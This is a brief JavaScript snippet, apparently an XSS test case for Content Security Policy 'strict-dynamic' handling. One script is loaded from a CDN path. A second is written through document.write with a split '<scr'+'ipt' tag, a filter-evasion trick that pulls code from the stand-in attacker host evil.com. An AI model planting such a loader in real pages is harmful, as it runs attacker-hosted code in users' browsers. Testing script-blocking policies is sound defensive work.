var s = document.createElement('script');
s.src = 'http://mycdn.com:3000/server/xss/Strict%20Dynamic/thirdparty.js';
document.head.appendChild(s);

document.write('<scr' + 'ipt src="http://evil.com:4000/evil.js"></scr' + 'ipt>');

